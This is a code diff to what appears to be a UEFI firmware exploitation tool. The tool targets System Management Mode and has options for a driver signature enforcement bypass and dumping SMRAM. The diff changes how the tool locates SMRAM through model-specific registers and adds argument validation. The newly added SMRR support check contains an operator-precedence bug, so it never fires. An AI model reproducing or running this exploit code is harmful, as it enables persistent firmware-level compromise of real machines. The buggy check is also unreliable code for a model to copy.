@@ -13,7 +13,7 @@
 // SMM related model specific registers of Intel
 #define IA32_SMRR_PHYSBASE              0x1F2 // SMRR base address
 #define IA32_SMRR_PHYSMASK              0x1F3 // SMRR range mask
-#define MTRRCAP                         0xFE  // MTRR capabilities
+#define IA32_MTRRCAP                    0xFE  // MTRR capabilities
 
 // commands to smm_handler()
 #define SMM_HANDLER_OP_NONE             0   // do nothing, just check for successful exploitation
@@ -421,28 +421,42 @@ int exploit(PSMM_HANDLER_CONTEXT context, int target, const char *data_file)
 //--------------------------------------------------------------------------------------
 unsigned long long smram_addr(void)
 {
-    unsigned long long ret = 0;
+    unsigned long long val = 0;
 
-    if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &ret))
+    if (uefi_expl_msr_get(IA32_MTRRCAP, &val))
     {
-        // get PhysBase field of IA32_SMRR_PHYSBASE, bits 12 through 31
-        ret &= 0xFFFFF000;
+        // check if IA32_SMRR_PHYSBASE and IA32_SMRR_PHYSMASK are available (11 bit)
+        if (val & 0x800 == 0)
+        {
+            printf(__FUNCTION__"() ERROR: SMRR is not supported on this system\n");
+            return 0;
+        }
+
+        if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &val))
+        {
+            // get PhysBase field of IA32_SMRR_PHYSBASE, bits 12 through 31
+            return val & 0xFFFFF000;
+        }
+        else
+        {
+            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
+        }
     }
     else
     {
         printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
-    }
+    }    
 
-    return ret;
+    return 0;
 }
 //--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {
     int ret = -1, target = -1;
-    unsigned int length = 0;
-    SMM_HANDLER_CONTEXT context;
+    unsigned int length = 0;    
     const char *data_file = NULL;
     bool use_dse_bypass = false, use_test = false, use_smram_dump = false;
+    SMM_HANDLER_CONTEXT context;
 
     memset(&context, 0, sizeof(context));
     context.op = SMM_HANDLER_OP_NONE;
@@ -550,6 +564,11 @@ int _tmain(int argc, _TCHAR* argv[])
         {
             // dump SMRAM contents
             use_smram_dump = true;
+        }
+        else
+        {
+            printf("ERROR: Unknown option %s\n", argv[i]);
+            return -1;
         }
     }
 
